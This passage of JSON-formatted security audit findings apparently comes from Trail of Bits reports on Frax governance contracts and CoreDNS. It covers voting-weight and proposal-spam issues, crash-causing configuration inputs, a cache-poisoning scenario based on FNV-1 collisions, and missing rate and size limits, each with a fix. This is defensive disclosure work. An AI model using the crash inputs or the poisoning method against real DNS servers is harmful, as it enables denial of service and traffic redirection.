"https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf", "body": "The user documentation concerning the calculation of voting power is unclear. The Frax-Governance specication sheet provided by the Frax Finance team states, Voting power goes to 0 at veFXS lock expiration time, this is dierent from veFXS.getBalance() which will return the locked amount of FXS after the lock has expired. This statement is in line with the codes behavior. The _calculateVotingWeight function in the VeFxsVotingDelegation contract does not return the locked veFXS balance once a lock has expired. /// @notice The ```_calculateVotingWeight``` function calculates ```account```'s voting weight. Is 0 if they ever delegated and the delegation is in effect. /// @param voter Address of voter /// @param timestamp A block.timestamp, typically corresponding to a proposal snapshot /// @return votingWeight Voting weight corresponding to ```account```'s veFXS balance function _calculateVotingWeight ( address voter , uint256 timestamp ) internal view returns ( uint256 ) { // If lock is expired they have no voting weight if (VE_FXS.locked(voter).end <= timestamp) return 0 ; uint256 firstDelegationTimestamp = $delegations[voter].firstDelegationTimestamp; // Never delegated OR this timestamp is before the first delegation by account if (firstDelegationTimestamp == 0 || timestamp < firstDelegationTimestamp) { try VE_FXS.balanceOf({ addr: voter, _t: timestamp }) returns ( uint256 _balance ) { return _balance; } catch {} } return 0 ; } Figure 7.2: The function that calculates the voting weight in VeFxsVotingDelegation.sol If a voters lock has expired or was never created, the short-circuit condition returns zero voting power. This behavior contrasts with the veFxs.balanceOf function, which would return the users last locked FXS balance. @external @view def balanceOf (addr: address, _t: uint256 = block.timestamp) -> uint256: \"\"\" @notice Get the current voting power for `msg.sender` @dev Adheres to the ERC20 `balanceOf` interface for Aragon compatibility @param addr User wallet address @param _t Epoch time to return voting power at @return User voting power \"\"\" _epoch: uint256 = self .user_point_epoch[addr] if _epoch == 0 : return 0 else : last_point: Point = self .user_point_history[addr][_epoch] last_point.bias -= last_point.slope * convert(_t - last_point.ts, int128) if last_point.bias < 0 : last_point.bias = 0 unweighted_supply: uint256 = convert(last_point.bias, uint256) # Original from veCRV weighted_supply: uint256 = last_point.fxs_amt + (VOTE_WEIGHT_MULTIPLIER * unweighted_supply) return weighted_supply Figure 7.1: The balanceOf function in veFXS.vy This divergence should be clearly documented in the code and should be reected in Frax Finances public-facing documentation, which does not mention the fact that an expired lock does not hold any voting power: Each veFXS has 1 vote in governance proposals. Staking 1 FXS for the maximum time, 4 years, would generate 4 veFXS. This veFXS balance itself will slowly decay down to 1 veFXS after 4 years, [...]. Exploit Scenario Alice buys FXS to be able to vote on a proposal. She is not aware that she is required to create a lock (even if expired) to have any voting power at all. She is unable to vote for the proposal. Recommendations Short term, modify the VeFxsVotingDelegation contract to reect the desired voting power curve and/or document whether this is intended behavior. Long term, make sure to keep public-facing documentation up to date when changes are made.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "8. Spamming risk in propose functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf", "body": "Anyone with enough veFXS tokens to meet the proposal threshold can submit an unbounded number of proposals to both the FraxGovernorAlpha and FraxGovernorOmega contracts. The only requirement for submitting proposals is that the msg.sender address must have a balance of veFXS tokens larger than the _proposalThreshold value. Once that requirement is met, a user can submit as many proposals as they would like. A large volume of proposals may create diculties for o-chain monitoring solutions and user-interface interactions. function _requireSenderAboveProposalThreshold() internal view { if (_getVotes(msg.sender, block.timestamp - 1, \"\") < proposalThreshold()) { revert SenderVotingWeightBelowProposalThreshold(); } } Figure 8.1: The _requireSenderAboveProposalThreshold function, called by the propose function ( FraxGovernorBase.sol#L104-L108 ) Exploit Scenario Mallory has 100,000 voting power. She submits one million proposals with small but unique changes to the description eld of each one. The system saves one million unique proposals and emits one million ProposalCreated events. Front-end components and o-chain monitoring systems are spammed with large quantities of data. Recommendations Short term, track and limit the number of proposals a user can have active at any given time. Long term, consider cases of user interactions beyond just the intended use cases for potential malicious behavior. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "1. Risk of a race condition in the secondary plugins setup function ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "When it fails to transfer a zone from another server, the setup function of the secondary plugin prints a message to standard output. It obtains the name of the zone, stored in the variable n , from a loop and prints the message in an anonymous inner goroutine. However, the variable is not copied before being used in the anonymous goroutine, and the value that n points to is likely to change by the time the scheduler executes the goroutine. Consequently, the value of n will be inaccurate when it is printed. 19 24 26 27 29 30 31 32 35 36 40 func setup(c *caddy.Controller) error { // (...). for _, n := range zones.Names { // (...) c.OnStartup( func () error { z.StartupOnce.Do( func () { go func () { // (...) for { // (...) log.Warningf( \"All '%s' masters failed to transfer, retrying in %s: %s\" , n , dur.String(), err) // (...) 41 46 47 48 49 50 51 52 53 } } } z.Update() }() }) return nil }) Figure 1.1: The value of n is not copied before it is used in the anonymous goroutine and could be logged incorrectly. ( plugin/secondary/setup.go#L19-L53 ) Exploit Scenario An operator of a CoreDNS server enables the secondary plugin. The operator sees an error in the standard output indicating that the zone transfer failed. However, the error points to an invalid zone, making it more dicult for the operator to troubleshoot and x the issue. Recommendations Short term, create a copy of n before it is used in the anonymous goroutine. See Appendix B for a proof of concept demonstrating this issue and an example of the x. Long term, integrate  anonymous-race-condition Semgrep rule into the CI/CD pipeline to catch this type of race condition.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Undetermined"]}, {"title": "2. Upstream errors captured in the grpc plugin are not returned ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "In the ServeDNS implementation of the grpc plugin, upstream errors are captured in a loop. However, once an error is captured in the upstreamErr variable, the function exits with a nil error; this is because there is no break statement forcing the function to exit the loop and to reach a return statement, at which point it would return the error value. The ServeDNS function of the forward plugin includes a similar but correct implementation. func (g *GRPC) ServeDNS(ctx context.Context, w dns.ResponseWriter, r *dns.Msg) ( int , error ) { // (...) upstreamErr = err // Check if the reply is correct; if not return FormErr. if !state.Match(ret) { debug.Hexdumpf(ret, \"Wrong reply for id: %d, %s %d\" , ret.Id, state.QName(), state.QType()) formerr := new (dns.Msg) formerr.SetRcode(state.Req, dns.RcodeFormatError) w.WriteMsg(formerr) return 0 , nil } w.WriteMsg(ret) return 0 , nil } if upstreamErr != nil { return dns.RcodeServerFailure, upstreamErr } Figure 2.1: plugin/secondary/setup.go#L19-L53 Exploit Scenario An operator runs CoreDNS with the grpc plugin. Upstream errors cause the gRPC functionality to fail. However, because the errors are not logged, the operator remains unaware of their root cause and has diculty troubleshooting and remediating the issue. Recommendations Short term, correct the ineectual assignment to ensure that errors captured by the plugin are returned. Long term, integrate ineffassign into the CI/CD pipeline to catch this and similar issues.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Undetermined"]}, {"title": "3. Index-out-of-range panic in autopath plugin initialization ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "The following syntax is used to congure the autopath plugin: autopath [ZONE...] RESOLV-CONF The RESOLV-CONF parameter can point to a resolv.conf(5) conguration le or to another plugin, if the string in the resolv variable is prexed with an @ symbol (e.g., @kubernetes). However, the autoPathParse function does not ensure that the length of the RESOLV-CONF parameter is greater than zero before dereferencing its rst element and comparing it with the @ character. func autoPathParse(c *caddy.Controller) (*AutoPath, string , error ) { ap := &AutoPath{} mw := \"\" for c.Next() { zoneAndresolv := c.RemainingArgs() if len (zoneAndresolv) < 1 { return ap, \"\" , fmt.Errorf( \"no resolv-conf specified\" ) } resolv := zoneAndresolv[ len (zoneAndresolv)- 1 ] if resolv[ 0 ] == '@' { mw = resolv[ 1 :] Figure 3.1: The length of resolv may be zero when the rst element is checked. ( plugin/autopath/setup.go#L45-L54 ) Specifying a conguration le with a zero-length RESOLV-CONF parameter, as shown in gure 3.2, would cause CoreDNS to panic. 0 autopath \"\" Figure 3.2: An autopath conguration with a zero-length RESOLV-CONF parameter panic: runtime error: index out of range [0] with length 0 goroutine 1 [running]: github.com/coredns/coredns/plugin/autopath.autoPathParse(0xc000518870) /home/ubuntu/audit-coredns/client-code/coredns/plugin/autopath/setup.go:53 +0x35c github.com/coredns/coredns/plugin/autopath.setup(0xc000518870) /home/ubuntu/audit-coredns/client-code/coredns/plugin/autopath/setup.go:16 +0x33 github.com/coredns/caddy.executeDirectives(0xc00029eb00, {0x7ffdc770671b, 0x8}, {0x324cfa0, 0x31, 0x1000000004b7e06}, {0xc000543260, 0x1, 0x8}, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:661 +0x5f6 github.com/coredns/caddy.ValidateAndExecuteDirectives({0x22394b8, 0xc0003e8a00}, 0xc0003e8a00, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:612 +0x3e5 github.com/coredns/caddy.startWithListenerFds({0x22394b8, 0xc0003e8a00}, 0xc00029eb00, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:515 +0x274 github.com/coredns/caddy.Start({0x22394b8, 0xc0003e8a00}) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:472 +0xe5 github.com/coredns/coredns/coremain.Run() /home/ubuntu/audit-coredns/client-code/coredns/coremain/run.go:62 +0x1cd main.main() /home/ubuntu/audit-coredns/client-code/coredns/coredns.go:12 +0x17 Figure 3.3: CoreDNS panics when loading the autopath conguration. Exploit Scenario An operator of a CoreDNS server provides an empty RESOLV-CONF parameter when conguring the autopath plugin, causing a panic. Because CoreDNS does not provide a clear explanation of what went wrong, it is dicult for the operator to troubleshoot and x the issue. Recommendations Short term, verify that the resolv variable is a non-empty string before indexing it. Long term, review the codebase for instances in which data is indexed without undergoing a length check; handling untrusted data in this way may lead to a more severe denial of service (DoS).", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "4. Index-out-of-range panic in forward plugin initialization ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "Initializing the forward plugin involves parsing the relevant conguration section. func parseStanza(c *caddy.Controller) (*Forward, error ) { f := New() if !c.Args(&f.from) { return f, c.ArgErr() } origFrom := f.from zones := plugin.Host(f.from).NormalizeExact() f.from = zones[ 0 ] // there can only be one here, won't work with non-octet reverse Figure 4.1: The length of the zones variable may be zero when the rst element is checked. ( plugin/forward/setup.go#L89-L97 ) An invalid conguration le for the forward plugin could cause the zones variable to have a length of zero. A Base64-encoded example of such a conguration le is shown in gure 4.2. Lgpmb3J3YXJkIE5vTWF0Pk69VL0vvVN0ZXJhbENoYXJDbGFzc0FueUNoYXJOb3ROTEEniez6bnlDaGFyQmVnaW5MaW5l RW5kTGluZUJlZ2luVGV4dEVuZFRleHRXb3JkQm91bmRhcnlOb1dvYXRpbmcgc3lzdGVtIDogImV4dCIsICJ4ZnMiLCAi bnRTaW50NjRLaW5kZnMiLiB5IGluZmVycmVkIHRvIGJlIGV4dCBpZiB1bnNwZWNpZmllZCBlIDogaHR0cHM6Di9rdWJl cm5ldGVzaW9kb2NzY29uY2VwdHNzdG9yYWdldm9sdW1lcyMgIiIiIiIiIiIiIiIiJyCFmIWlsZj//4WuhZilr4WY5bCR mPCd Figure 4.2: The Base64-encoded forward conguration le Specifying a conguration le like that shown above would cause CoreDNS to panic when attempting to access the rst element of zones : panic: runtime error: index out of range [0] with length 0 goroutine 1 [running]: github.com/coredns/coredns/plugin/forward.parseStanza(0xc000440000) /home/ubuntu/audit-coredns/client-code/coredns/plugin/forward/setup.go:97 +0x972 github.com/coredns/coredns/plugin/forward.parseForward(0xc000440000) /home/ubuntu/audit-coredns/client-code/coredns/plugin/forward/setup.go:81 +0x5e github.com/coredns/coredns/plugin/forward.setup(0xc000440000) /home/ubuntu/audit-coredns/client-code/coredns/plugin/forward/setup.go:22 +0x33 github.com/coredns/caddy.executeDirectives(0xc0000ea800, {0x7ffdf9f6e6ed, 0x36}, {0x324cfa0, 0x31, 0x1000000004b7e06}, {0xc00056a860, 0x1, 0x8}, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:661 +0x5f6 github.com/coredns/caddy.ValidateAndExecuteDirectives({0x22394b8, 0xc00024ea80}, 0xc00024ea80, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:612 +0x3e5 github.com/coredns/caddy.startWithListenerFds({0x22394b8, 0xc00024ea80}, 0xc0000ea800, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:515 +0x274 github.com/coredns/caddy.Start({0x22394b8, 0xc00024ea80}) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:472 +0xe5 github.com/coredns/coredns/coremain.Run() /home/ubuntu/audit-coredns/client-code/coredns/coremain/run.go:62 +0x1cd main.main() /home/ubuntu/audit-coredns/client-code/coredns/coredns.go:12 +0x17 Figure 4.3: CoreDNS panics when loading the forward conguration. Exploit Scenario An operator of a CoreDNS server miscongures the forward plugin, causing a panic. Because CoreDNS does not provide a clear explanation of what went wrong, it is dicult for the operator to troubleshoot and x the issue. Recommendations Short term, verify that the zones variable has the correct number of elements before indexing it. Long term, review the codebase for instances in which data is indexed without undergoing a length check; handling untrusted data in this way may lead to a more severe DoS.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "5. Use of deprecated PreferServerCipherSuites eld ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "In the setTLSDefaults function of the tls plugin, the TLS conguration object includes a PreferServerCipherSuites eld, which is set to true . func setTLSDefaults(tls *ctls.Config) { tls.MinVersion = ctls.VersionTLS12 tls.MaxVersion = ctls.VersionTLS13 tls.CipherSuites = [] uint16 { ctls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384, ctls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384, ctls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305, ctls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305, ctls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, ctls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, ctls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384, ctls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384, ctls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, } tls.PreferServerCipherSuites = true } Figure 5.1: plugin/tls/tls.go#L22-L37 In the past, this property controlled whether a TLS connection would use the cipher suites preferred by the server or by the client. However, as of Go 1.17, this eld is ignored. According to the Go documentation for crypto/tls , Servers now select the best mutually supported cipher suite based on logic that takes into account inferred client hardware, server hardware, and security. When CoreDNS is built using a recent Go version, the use of this property is redundant and may lead to false assumptions about how cipher suites are negotiated in a connection to a CoreDNS server. Recommendations Short term, add this issue to the internal issue tracker. Additionally, when support for Go versions older than 1.17 is entirely phased out of CoreDNS, remove the assignment to the deprecated PreferServerCipherSuites eld.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "6. Use of the MD5 hash function to detect Corele changes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "The reload plugin is designed to automatically detect changes to a Corele and to reload it if necessary. To determine whether a le has changed, the plugin periodically compares the current MD5 hash of the le to the last hash calculated for it ( plugin/reload/reload.go#L81-L107 ). If the values are dierent, it reloads the Corele. However, the MD5 hash functions vulnerability to collisions decreases the reliability of this process; if two dierent les produce the same hash value, the plugin will not detect the dierence between them. Exploit Scenario An operator of a CoreDNS server modies a Corele, but the MD5 hash of the modied le collides with that of the old le. As a result, the reload plugin does not detect the change. Instead, it continues to use the outdated server conguration without alerting the operator to its use. Recommendations Short term, improve the robustness of the reload plugin by using the SHA-512 hash function instead of MD5.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "7. Use of default math/rand seed in grpc and forward plugins random server-selection policy ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "The grpc and forward plugins use the random policy for selecting upstream servers. The implementation of this policy in the two plugins is identical and uses the math/rand package from the Go standard library. func (r *random) List(p []*Proxy) []*Proxy { switch len (p) { case 1 : return p case 2 : if rand.Int()% 2 == 0 { return []*Proxy{p[ 1 ], p[ 0 ]} // swap } return p } perms := rand.Perm( len (p)) rnd := make ([]*Proxy, len (p)) for i, p1 := range perms { rnd[i] = p[p1] } return rnd } Figure 7.1: plugin/grpc/policy.go#L19-L37 As highlighted in gure 7.1, the random policy uses either rand.Int or rand.Perm to choose the order of the upstream servers, depending on the number of servers that have been congured. Unless a program using the random policy explicitly calls rand.Seed , the top-level functions rand.Int and rand.Perm behave as if they were seeded with the value 1 , which is the default seed for math/rand . CoreDNS does not call rand.Seed to seed the global state of math/rand . Without this call, the grpc and forward plugins random selection of upstream servers is likely to be trivially predictable and the same every time CoreDNS is restarted. Exploit Scenario An attacker targets a CoreDNS instance in which the grpc or forward plugin is enabled. The attacker exploits the deterministic selection of upstream servers to overwhelm a specic server, with the goal of causing a DoS condition or performing an attack such as a timing attack. Recommendations Short term, instantiate a rand.Rand type with a unique seed, rather than drawing random numbers from the global math/rand state. CoreDNS takes this approach in several other areas, such as the loop plugin .", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "8. Cache plugin does not account for hash table collisions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "To cache a DNS reply, CoreDNS maps the FNV-1 hash of the query name and type to the content of the reply in a hash table entry. func key(qname string , m *dns.Msg, t response.Type) ( bool , uint64 ) { // We don't store truncated responses. if m.Truncated { return false , 0 } // Nor errors or Meta or Update. if t == response.OtherError || t == response.Meta || t == response.Update { return false , 0 } return true , hash(qname, m.Question[ 0 ].Qtype) } func hash(qname string , qtype uint16 ) uint64 { h := fnv.New64() h.Write([] byte { byte (qtype >> 8 )}) h.Write([] byte { byte (qtype)}) h.Write([] byte (qname)) return h.Sum64() } Figure 8.1: plugin/cache/cache.go#L68-L87 To check whether there is a cached reply for an incoming query, CoreDNS performs a hash table lookup for the query name and type. If it identies a reply with a valid time to live (TTL), it returns the reply. CoreDNS assumes the stored DNS reply to be the correct one for the query, given the use of a hash table mapping. However, this assumption is faulty, as FNV-1 is a non-cryptographic hash function that does not oer collision resistance, and there exist utilities for generating colliding inputs to FNV-1 . As a result, it is likely possible to construct a valid (qname , qtype) pair that collides with another one, in which case CoreDNS could serve the incorrect cached reply to a client. Exploit Scenario An attacker aiming to poison the cache of a CoreDNS server generates a valid (qname* , qtype*) pair whose FNV-1 hash collides with a commonly queried (qname , qtype) pair. The attacker gains control of the authoritative name server for qname* and points its qtype* record to an address of his or her choosing. The attacker also congures the server to send a second record when (qname* , qtype*) is queried: a qtype record for qname that points to a malicious address. The attacker queries the CoreDNS server for (qname* , qtype*) , and the server caches the reply with the malicious address. Soon thereafter, when a legitimate user queries the server for (qname , qtype) , CoreDNS serves the user the cached reply for (qname* , qtype*) , since it has an identical FNV-1 hash. As a result, the legitimate users DNS client sees the malicious address as the record for qname . Recommendations Short term, store the original name and type of a query in the value of a hash table entry. After looking up the key for an incoming request in the hash table, verify that the query name and type recorded alongside the cached reply match those of the request. If they do not, disregard the cached reply. Short term, use the keyed hash function SipHash instead of FNV-1. SipHash was designed for speed and derives a 64-bit output value from an input value and a 128-bit secret key; this method adds pseudorandomness to a hash table key and makes it more dicult for an attacker to generate collisions oine. CoreDNS should use the crypto/rand package from Gos standard library to generate a cryptographically random secret key for SipHash on startup.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Undetermined"]}, {"title": "9. Index-out-of-range reference in kubernetes plugin ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "The parseRequest function of the kubernetes plugin parses a DNS request before using it to query Kubernetes. By fuzzing the function, we discovered an out-of-range issue that can cause a panic. The issue occurs when the function calls stripUnderscore with an empty string, as it does when it receives a request with the qname .o.o.po.pod.8 and the zone interwebs. // stripUnderscore removes a prefixed underscore from s. func stripUnderscore(s string ) string { if s[ 0 ] != '_' { return s } return s[ 1 :] } Figure 9.1: plugin/kubernetes/parse.go#L97 Because of the time constraints of the audit, we could not nd a way to directly exploit this vulnerability. Although certain tools for sending DNS queries, like dig and host , verify the validity of a host before submitting a DNS query, it may be possible to exploit the vulnerability by using custom tooling or DNS over HTTPs (DoH). Exploit Scenario An attacker nds a way to submit a query with an invalid host (such as o.o.po.pod.8) to a CoreDNS server running as the DNS server for a Kubernetes endpoint. Because of the index-out-of-range bug, the kubernetes plugin causes CoreDNS to panic and crash, resulting in a DoS. Recommendations Short term, to prevent a panic, implement a check of the value of the string passed to the stripUnderscore function.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "10. Calls to time.After() in select statements can lead to memory leaks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "Calls to the time.After function in select/case statements within for loops can lead to memory leaks. This is because the garbage collector does not clean up the underlying Timer object until the timer has red. A new timer is initialized at the start of each iteration of the for loop (and therefore with each select statement), which requires resources. As a result, if many routines originate from a time.After call, the system may experience memory overconsumption. for { select { case <-ctx.Done(): log.Debugf( \"Breaking out of CloudDNS update loop for %v: %v\" , h.zoneNames, ctx.Err()) return case <-time.After( 1 * time.Minute) : if err := h.updateZones(ctx); err != nil && ctx.Err() == nil /* Don't log error if ctx expired. */ { log.Errorf( \"Failed to update zones %v: %v\" , h.zoneNames, err) } Figure 10.1: A time.After() routine that causes a memory leak ( plugin/clouddns/clouddns.go#L85-L93 ) The following portions of the code contain similar patterns:  plugin/clouddns/clouddns.go#L85-L93  plugin/azure/azure.go#L87-96  plugin/route53/route53.go#87-96 Exploit Scenario An attacker nds a way to overuse a function, which leads to overconsumption of a CoreDNS servers memory and a crash. Recommendations Short term, use a ticker instead of the time.After function in select/case statements included in for loops. This will prevent memory leaks and crashes caused by memory exhaustion. Long term, avoid using the time.After method in for-select routines and periodically use a Semgrep query to detect similar patterns in the code. References  DevelopPaper post on the memory leak vulnerability in time.After   Golang <-time.After() Is Not Garbage Collected before Expiry  (Medium post)", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "11. Incomplete list of debugging data exposed by the prometheus plugin ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "Enabling the prometheus (metrics) plugin exposes an HTTP endpoint that lists CoreDNS metrics. The documentation for the plugin indicates that it reports data such as the total number of queries and the size of responses. However, other data that is reported by the plugin (and also available through the pprof plugin) is not listed in the documentation. This includes Go runtime debugging information such as the number of running goroutines and the duration of Go garbage collection runs. Because this data is not listed in the prometheus plugin documentation, operators may initially be unaware of its exposure. Moreover, the data could be instrumental in formulating an attack. # TYPE go_gc_duration_seconds summary go_gc_duration_seconds{quantile=\"0\"} 4.4756e-05 go_gc_duration_seconds{quantile=\"0.25\"} 6.0522e-05 go_gc_duration_seconds{quantile=\"0.5\"} 7.1476e-05 go_gc_duration_seconds{quantile=\"0.75\"} 0.000105802 go_gc_duration_seconds{quantile=\"1\"} 0.000205775 go_gc_duration_seconds_sum 0.010425592 go_gc_duration_seconds_count 123 # HELP go_goroutines Number of goroutines that currently exist. # TYPE go_goroutines gauge go_goroutines 18 # HELP go_info Information about the Go environment. # TYPE go_info gauge go_info{version=\"go1.17.3\"} 1 # HELP go_memstats_alloc_bytes Number of bytes allocated and still in use. # TYPE go_memstats_alloc_bytes gauge Figure 11.1: Examples of the data exposed by prometheus and omitted from the documentation Exploit Scenario An attacker discovers the metrics exposed by CoreDNS over port 9253. The attacker then monitors the endpoint to determine the eectiveness of various attacks in crashing the server. Recommendations Short term, document all data exposed by the prometheus plugin. Additionally, consider changing the data exposed by the prometheus plugin to exclude Go runtime data available through the pprof plugin.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "12. Cloud integrations require cleartext storage of keys in the Corele ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "The route53 , azure , and clouddns plugins enable CoreDNS to interact with cloud providers (AWS, Azure, and the Google Cloud Platform (GCP), respectively). To access clouddns , a user enters the path to the le containing his or her GCP credentials. When using route53 , CoreDNS pulls the AWS credentials that the user has entered in the Corele. If the AWS credentials are not included in the Corele, CoreDNS will pull them in the same way that the AWS command-line interface (CLI) would. While operators have options for the way that they provide AWS and GCP credentials, Azure credentials must be pulled directly from the Corele. Furthermore, the CoreDNS documentation lacks guidance on the risks of storing AWS, Azure, or GCP credentials in local conguration les . Exploit Scenario An attacker or malicious internal user gains access to a server running CoreDNS. The malicious actor then locates the Corele and obtains credentials for a cloud provider, thereby gaining access to a cloud infrastructure. Recommendations Short term, remove support for entering cloud provider credentials in the Corele in cleartext. Instead, load credentials for each provider in the manner recommended in that providers documentation and implemented by its CLI utility. CoreDNS should also refuse to load credential les with overly broad permissions and warn users about the risks of such les.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "13. Lack of rate-limiting controls ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "CoreDNS does not enforce rate limiting of DNS queries, including those sent via DoH. As a result, we were able to issue the same request thousands of times in less than one minute over the HTTP endpoint /dns-query . Figure 13.1: We sent 3,424 requests to CoreDNS without being rate limited. During our tests, the lack of rate limiting did not appear to aect the application. However, processing requests sent at such a high rate can consume an inordinate amount of host resources, and a lack of rate limiting can facilitate DoS and DNS amplication attacks. Exploit Scenario An attacker oods a CoreDNS server with HTTP requests, leading to a DoS condition. Recommendations Short term, consider incorporating the rrl plugin, used for the rate limiting of DNS queries, into the CoreDNS codebase. Additionally, implement rate limiting on all API endpoints. An upper bound can be applied at a high level to all endpoints exposed by CoreDNS. Long term, run stress tests to ensure that the rate limiting enforced by CoreDNS is robust.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "14. Lack of a limit on the size of response bodies ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "The ioutil.ReadAll function reads from a source input until encountering an error or the end of the le, at which point it returns the data that it read. The toMsg function, which processes requests for the HTTP server, uses ioutil.ReadAll to parse requests and to read POST bodies. However, there is no limit on the size of request bodies. Using ioutil.ReadAll to parse a large request that is loaded multiple times may exhaust the systems memory, causing a DoS. func toMsg(r io.ReadCloser) (*dns.Msg, error ) { buf, err := io.ReadAll(r) if err != nil { return nil , err } m := new (dns.Msg) err = m.Unpack(buf) return m, err } Figure 14.1: plugin/pkg/doh/doh.go#L94-L102 Exploit Scenario An attacker generates multiple POST requests with long request bodies to /dns-query , leading to the exhaustion of its resources. Recommendations Short term, use the io.LimitReader function or another mechanism to limit the size of request bodies. Long term, consider implementing application-wide limits on the size of request bodies to prevent DoS attacks.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "15. Index-out-of-range panic in grpc plugin initialization ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "Initializing the grpc plugin involves parsing the relevant conguration section. func parseStanza(c *caddy.Controller) (*GRPC, error ) { g := newGRPC() if !c.Args(&g.from) { return g, c.ArgErr() } g.from = plugin.Host(g.from).NormalizeExact()[ 0 ] // only the first is used. Figure 15.1: plugin/grpc/setup.go#L53-L59 An invalid conguration le for the grpc plugin could cause the call to NormalizeExtract (highlighted in gure 15.1) to return a value with zero elements. A Base64-encoded example of such a conguration le is shown below. MApncnBjIDAwMDAwMDAwMDAwhK2FhYKtMIStMITY2NnY2dnY7w== Figure 15.2: The Base64-encoded grpc conguration le Specifying a conguration le like that in gure 15.2 would cause CoreDNS to panic when attempting to access the rst element of the return value. panic: runtime error: index out of range [0] with length 0 goroutine 1 [running]: github.com/coredns/coredns/plugin/grpc.parseStanza(0xc0002f0900) /home/ubuntu/audit-coredns/client-code/coredns/plugin/grpc/setup.go:59 +0x31b github.com/coredns/coredns/plugin/grpc.parseGRPC(0xc0002f0900) /home/ubuntu/audit-coredns/client-code/coredns/plugin/grpc/setup.go:45 +0x5e github.com/coredns/coredns/plugin/grpc.setup(0x1e4dcc0) /home/ubuntu/audit-coredns/client-code/coredns/plugin/grpc/setup.go:17 +0x30 github.com/coredns/caddy.executeDirectives(0xc0000e2900, {0x7ffc15b696e0, 0x31}, {0x324cfa0, 0x31, 0x1000000004b7e06}, {0xc000269300, 0x1, 0x8}, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:661 +0x5f6 github.com/coredns/caddy.ValidateAndExecuteDirectives({0x2239518, 0xc0002b2980}, 0xc0002b2980, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:612 +0x3e5 github.com/coredns/caddy.startWithListenerFds({0x2239518, 0xc0002b2980}, 0xc0000e2900, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:515 +0x274 github.com/coredns/caddy.Start({0x2239518, 0xc0002b2980}) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:472 +0xe5 github.com/coredns/coredns/coremain.Run() /home/ubuntu/audit-coredns/client-code/coredns/coremain/run.go:62 +0x1cd main.main() /home/ubuntu/audit-coredns/client-code/coredns/coredns.go:12 +0x17 Figure 15.3: CoreDNS panics when loading the grpc conguration. Exploit Scenario An operator of a CoreDNS server miscongures the grpc plugin, causing a panic. Because CoreDNS does not provide a clear explanation of what went wrong, it is dicult for the operator to troubleshoot and x the issue. Recommendations Short term, verify that the variable returned by NormalizeExtract has at least one element before indexing it. 